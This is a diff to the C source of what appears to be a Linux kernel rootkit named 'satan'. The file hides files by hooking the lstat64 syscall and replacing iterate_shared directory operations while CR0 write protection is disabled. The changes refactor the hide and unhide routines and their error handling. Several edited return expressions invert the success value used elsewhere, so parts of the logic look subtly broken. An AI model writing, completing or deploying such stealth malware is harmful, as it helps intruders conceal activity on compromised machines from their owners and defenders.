@@ -34,7 +34,7 @@ struct hidden_file {
 static LIST_HEAD(hidden_files_list);  // list of hidden files.
 
 static struct hidden_file *hidden_files_list_get(const char *path);
-static struct hidden_file *hidden_files_list_add(const char *path);
+static int hidden_files_list_add(const char *path, struct hidden_file **buf);
 static int hidden_files_list_del(const char *path);
 
 
@@ -93,7 +93,7 @@ asmlinkage long satan_lstat64(const char __user *filename,
 
 int satan_file_init(void)
 {
-        return satan_syscall_hook(__NR_lstat64, satan_lstat64);
+        return satan_syscall_hook(__NR_lstat64, satan_lstat64) == 0;
 }
 
 void satan_file_exit(void)
@@ -127,15 +127,14 @@ void satan_file_exit(void)
  */
 int satan_file_hide(const char *path)
 {
-        struct hidden_file *f = hidden_files_list_get(path);
+        struct hidden_file *f = NULL;
 
-        if (f) {
-                pr_alert("satan: file: %s is already hidden\n", path);
-                return 1;
-        }
-
-        f = hidden_files_list_add(path);
-        return satan_file_hook_iterate_shared(f);
+        // If a struct hidden_file is successfully added into
+        // hidden_files_list, then hidden_files_list_add() will
+        // return 0 and place the address of the newly added
+        // struct hidden_file in f.
+        return hidden_files_list_add(path, &f) == 0 &&
+               satan_file_hook_iterate_shared(f) == 0;
 }
 
 /**
@@ -146,22 +145,11 @@ int satan_file_hide(const char *path)
  */
 int satan_file_unhide(const char *path)
 {
-        struct hidden_file *f = hidden_files_list_get(path);
+        struct hidden_file *f = NULL;
 
-        if (!f) {
-                pr_alert("satan: file: %s has not been hidden before\n", path);
-                return 1;
-        }
-
-        if (satan_file_unhook_iterate_shared(f) != 0) {
-                return 1;
-        }
-
-        if (hidden_files_list_del(path) != 0) {
-                return 1;
-        }
-
-        return 0;
+        return (f=hidden_files_list_get(path)) != NULL && 
+               satan_file_unhook_iterate_shared(f) == 0 &&
+               hidden_files_list_del(path) == 0;
 }
 
 
@@ -188,9 +176,17 @@ static struct hidden_file *hidden_files_list_get(const char *path)
         return NULL;
 }
 
-static struct hidden_file *hidden_files_list_add(const char *path)
+static int hidden_files_list_add(const char *path, struct hidden_file **buf)
 {
-        struct hidden_file *f = NULL;
+        int ret = 0;
+        struct hidden_file *f = hidden_files_list_get(path);
+
+        if (f) {
+                pr_alert("satan: file: %s is already hidden\n", path);
+                ret = 1;
+                goto out;
+        }
+
 
         memset(basename_buf, 0, BASENAME_BUF_SIZE);
         memset(filename_buf, 0, FILENAME_BUF_SIZE);
@@ -208,7 +204,12 @@ static struct hidden_file *hidden_files_list_add(const char *path)
 
         pr_info("satan: file: adding (%s,%s) to list of hidden files.\n", f->basename, f->filename);
         list_add_tail(&(f->list), &hidden_files_list);
-        return f;
+
+out:
+        if (buf)
+                *buf = f;
+
+        return ret;
 }
 
 static int hidden_files_list_del(const char *path)
@@ -217,6 +218,7 @@ static int hidden_files_list_del(const char *path)
 
         if (!f)
                 return 1;
+
 
         pr_info("satan: file: removing (%s,%s) from list of hidden files.\n", f->basename, f->filename);
         list_del(&(f->list));
@@ -286,12 +288,19 @@ static void real_iterate_shared_list_clear(void)
 static int satan_file_hook_iterate_shared(struct hidden_file *f)
 { 
         int ret = 0;
-        struct file *filp = filp_open(f->basename, O_RDONLY, 0);
+        struct file *filp = NULL;
         struct file_operations *f_op = NULL;
 
+        if (!f) {
+                pr_err("satan: file: hook_iterate_shared(f): f is NULL.\n");
+                return 1;
+        }
+
+
+        filp = filp_open(f->basename, O_RDONLY, 0);
 
         if (IS_ERR(filp)) {
-                pr_alert("satan: failed to open %s\n", f->basename);
+                pr_alert("satan: file: failed to open %s\n", f->basename);
                 ret = 1;
                 goto out;
         }
@@ -329,19 +338,27 @@ out:
 static int satan_file_unhook_iterate_shared(const struct hidden_file *f)
 {
         int ret = 0;
-        struct file *filp = filp_open(f->basename, O_RDONLY, 0);
+        struct file *filp = NULL;
         struct file_operations *f_op = NULL;
-        iterate_shared_t real_iterate_shared = real_iterate_shared_list_get(f->basename);
+        iterate_shared_t real_iterate_shared = NULL;
 
+        if (!f) {
+                pr_err("satan: file: hook_iterate_shared(f): f is NULL.\n");
+                return 1;
+        }
+
+
+        filp = filp_open(f->basename, O_RDONLY, 0);
 
         if (IS_ERR(filp)) {
-                pr_alert("satan: failed to open %s:\n", f->basename);
+                pr_alert("satan: satan: failed to open %s:\n", f->basename);
                 ret = 1;
                 goto out;
         }
 
 
         f_op = (struct file_operations *) filp->f_op;
+        real_iterate_shared = real_iterate_shared_list_get(f->basename);
 
         CR0_WP_DISABLE {
                 pr_info("satan: restoring iterate_shared from %p to %p\n",
